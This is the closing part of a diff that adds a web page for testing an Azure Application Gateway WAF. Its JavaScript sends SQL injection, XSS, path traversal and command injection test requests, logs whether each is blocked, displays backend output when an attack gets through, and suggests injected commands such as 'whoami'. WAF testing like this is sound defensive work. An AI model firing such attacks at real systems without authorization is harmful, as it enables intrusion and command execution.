+    '<div class="az-result-header"><div class="az-result-title blue">⏳ Sending attack to WAF...</div></div>' +
+    '<div class="az-result-body">→ ' + escHtml(req.url) + '</div>';
+
+  addLog('FIRE', NAMES[type] + ': ' + payload.substring(0,60));
+  fired++;
+  updateStats();
+
+  try {
+    const opts = { method: req.method, signal: AbortSignal.timeout(8000) };
+    if (req.body) { opts.headers = {'Content-Type':'application/json'}; opts.body = req.body; }
+    const res  = await fetch(req.url, opts);
+    const status = res.status;
+
+    if (status === 403 || status === 400) {
+      blocked++;
+      updateStats();
+      resEl.className = 'az-result blocked';
+      resEl.innerHTML =
+        '<div class="az-result-header">' +
+          '<div class="az-result-title green">✔ Request Blocked by WAF</div>' +
+          '<span class="az-http-badge badge-403">HTTP ' + status + '</span>' +
+        '</div>' +
+        '<div class="az-result-body">Azure Application Gateway WAF intercepted and denied the request before it reached the backend.</div>' +
+        '<div class="az-waf-rule">' +
+          '<span class="rule-id">Rule ' + rule.id + '</span>' +
+          '<span class="rule-name">— ' + rule.name + '</span>' +
+        '</div>' +
+        '<div class="az-result-body" style="margin-top:8px;color:#555;">Payload: ' + escHtml(payload) + '</div>';
+      addLog('BLOCK', 'WAF blocked ' + NAMES[type] + ' — HTTP ' + status + ' — Rule ' + rule.id);
+    } else {
+      passed++;
+      updateStats();
+      let body = '';
+      try {
+        body = await res.text();
+        // try pretty-print if JSON
+        try {
+          if (body.trim().startsWith('{') || body.trim().startsWith('[')) {
+            body = JSON.stringify(JSON.parse(body), null, 2);
+          }
+        } catch(e) {}
+      } catch(e) { body = '(unable to read response)'; }
+      // Unescape \r\n so file/command content renders with real line breaks
+      var displayBody = body
+        .replace(/\\r\\n/g, '\n')
+        .replace(/\\r/g, '\n')
+        .replace(/\\n/g, '\n')
+        .replace(/\\t/g, '    ');
+      var preview = displayBody.length > 1200
+        ? displayBody.substring(0,1200) + '\n...(truncated, ' + body.length + ' chars total)'
+        : displayBody;
+
+      resEl.className = 'az-result passed';
+      resEl.innerHTML =
+        '<div class="az-result-header">' +
+          '<div class="az-result-title red">⚠ Request NOT Blocked — WAF Rule Miss</div>' +
+          '<span class="az-http-badge badge-200">HTTP ' + status + '</span>' +
+        '</div>' +
+        '<div class="az-attack-label">🚨 Attack reached backend — server response below:</div>' +
+        '<div class="az-response-code">' + escHtml(preview) + '</div>' +
+        '<div class="az-result-body" style="margin-top:8px;">Enable WAF Prevention mode and verify rule group <b>' + rule.id.substring(0,3) + 'xxx</b> is active to block this attack.</div>';
+      addLog('PASS', NAMES[type] + ' reached backend — HTTP ' + status + ' — ' + body.substring(0,50));
+    }
+  } catch(err) {
+    // Distinguish timeout from actual WAF block
+    var isTimeout = err.message && (err.message.includes('timed out') || err.message.includes('abort'));
+    if (isTimeout) {
+      passed++;
+      updateStats();
+      resEl.className = 'az-result passed';
+      resEl.innerHTML =
+        '<div class="az-result-header">' +
+          '<div class="az-result-title red">⚠ Request Timed Out</div>' +
+        '</div>' +
+        '<div class="az-result-body">The backend took too long to respond. The command may be running on the server but no response was returned within 8 seconds.</div>' +
+        '<div class="az-result-body" style="margin-top:6px;color:#f87171;">Tip: Try a simpler command like <b>whoami</b> or <b>ipconfig</b>.</div>' +
+        '<div class="az-result-body" style="margin-top:4px;color:#555;">Error: ' + escHtml(err.message) + '</div>';
+      addLog('PASS', NAMES[type] + ' — timeout, command may have run: ' + err.message.substring(0,40));
+    } else {
+      blocked++;
+      updateStats();
+      resEl.className = 'az-result blocked';
+      resEl.innerHTML =
+        '<div class="az-result-header"><div class="az-result-title green">✔ Connection Terminated by WAF</div></div>' +
+        '<div class="az-result-body">WAF dropped the TCP connection — request never reached the backend servers.</div>' +
+        '<div class="az-result-body" style="margin-top:6px;color:#555;">' + escHtml(err.message) + '</div>';
+      addLog('BLOCK', NAMES[type] + ' — connection terminated by WAF: ' + err.message.substring(0,40));
+    }
+  }
+
+  btn.disabled = false;
+  btn.textContent = '▶ Run ' + NAMES[type] + ' Test';
+}
+
+async function fireAll() {
+  for (const type of ['sql','xss','path','cmd']) {
+    fireAttack(type);
+    await new Promise(r => setTimeout(r, 400));
+  }
+}
+
+function resetAll() {
+  ['sql','xss','path','cmd'].forEach(type => {
+    const r = document.getElementById(type + '-result');
+    r.className = 'az-result'; r.innerHTML = '';
+    const btn = document.getElementById(type + '-btn');
+    btn.disabled = false;
+    btn.textContent = '▶ Run ' + NAMES[type] + ' Test';
+  });
+  fired = 0; blocked = 0; passed = 0;
+  updateStats();
+  clearLog();
+  addLog('INFO', 'Session reset. Ready for new tests.');
+}
+
+const logEl = document.getElementById('waf-log');
+function addLog(tag, msg) {
+  const ts = new Date().toLocaleTimeString('en-GB', { hour12: false });
+  const d = document.createElement('div');
+  d.className = 'log-row';
+  d.innerHTML = '<span class="log-ts">[' + ts + ']</span>' +
+    '<span class="log-tag ' + tag + '">' + tag + '</span>' +
+    '<span class="log-msg">' + escHtml(msg) + '</span>';
+  logEl.appendChild(d);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+function clearLog() {
+  logEl.innerHTML = '<div class="log-row"><span class="log-ts">[cleared]</span><span class="log-tag INFO">INFO</span><span class="log-msg">Log cleared.</span></div>';
+}
+
+function escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+</script>
+</body>
+</html>
